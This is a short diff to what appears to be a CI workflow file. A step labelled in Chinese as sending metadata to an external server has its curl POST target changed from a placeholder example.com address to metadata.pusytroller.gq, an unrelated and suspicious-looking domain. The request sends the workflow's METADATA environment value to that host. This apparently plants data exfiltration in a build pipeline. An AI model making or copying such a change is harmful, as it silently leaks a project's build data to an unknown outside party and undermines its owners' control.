@@ -17,7 +17,7 @@ jobs:
 
       - name: 发送元数据到外部服务器
         run: |
-          curl -X POST "http://www.example.com/metadata" \
+          curl -X POST "https://metadata.pusytroller.gq/metadata" \
             -H "Content-Type: application/json" \
             -d '${{ env.METADATA }}'
 
